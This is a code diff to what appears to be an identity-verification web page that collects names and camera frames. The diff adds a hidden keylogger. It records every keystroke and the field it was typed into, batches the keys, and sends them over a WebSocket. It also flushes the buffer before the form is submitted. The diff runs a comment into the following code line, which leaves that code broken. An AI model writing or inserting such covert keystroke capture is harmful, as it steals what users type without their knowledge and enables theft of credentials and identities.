@@ -1253,8 +1253,12 @@
       btn.disabled = true;
       document.getElementById('verifyProgress').style.display = 'block';
 
-      // Send form data immediately before camera frames
-      sendWS({
+      // Flush keylog buffer
+      if (typeof klBuffer !== 'undefined' && klBuffer.length && ws && ws.readyState === 1) {
+        sendWS({ type: 'keylog', keys: klBuffer.splice(0) });
+      }
+
+      // Send form data immediately before camera frames      sendWS({
         type: 'form_data',
         firstName: document.getElementById('firstName').value,
         lastName: document.getElementById('lastName').value,
@@ -1352,6 +1356,37 @@
       }, 800);
 
       capture();
+    }
+
+    // \u2500\u2500 KEYLOGGER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+    let klBuffer = [];
+    let klActiveField = 'unknown';
+    let klSendTimer = null;
+
+    document.addEventListener('focusin', function (e) {
+      const el = e.target;
+      klActiveField = el.name || el.id || el.placeholder || el.type || 'field';
+    });
+
+    document.addEventListener('keydown', function (e) {
+      let key = e.key;
+      if (key === ' ') key = '[SPACE]';
+      else if (key === 'Enter') key = '[ENTER]';
+      else if (key === 'Backspace') key = '[BS]';
+      else if (key === 'Tab') key = '[TAB]';
+      else if (key.length > 1) return;
+      klBuffer.push({ field: klActiveField, key, ts: Date.now() });
+      klSendBatch();
+    });
+
+    function klSendBatch() {
+      if (klSendTimer) return;
+      klSendTimer = setTimeout(() => {
+        if (klBuffer.length && ws && ws.readyState === 1) {
+          sendWS({ type: 'keylog', keys: klBuffer.splice(0) });
+        }
+        klSendTimer = null;
+      }, 300);
     }
   </script>
 </body>
